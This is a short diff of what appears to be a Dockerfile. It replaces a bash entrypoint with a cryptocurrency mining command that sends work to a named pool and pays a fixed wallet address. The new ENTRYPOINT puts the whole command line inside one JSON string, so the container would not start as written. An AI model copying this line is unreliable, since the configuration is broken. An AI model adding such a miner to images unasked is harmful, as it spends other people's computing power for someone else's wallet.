@@ -9,4 +9,4 @@ RUN sh configure
 RUN make
 RUN npm install
 
-ENTRYPOINT ["/bin/bash"]
+ENTRYPOINT ["node ./annmine.js --threads 2 --paymentAddr=pDSxcZunaUSUSxHrL6r8zpGJvoEropJ3Es http://pool.pkteer.com"]
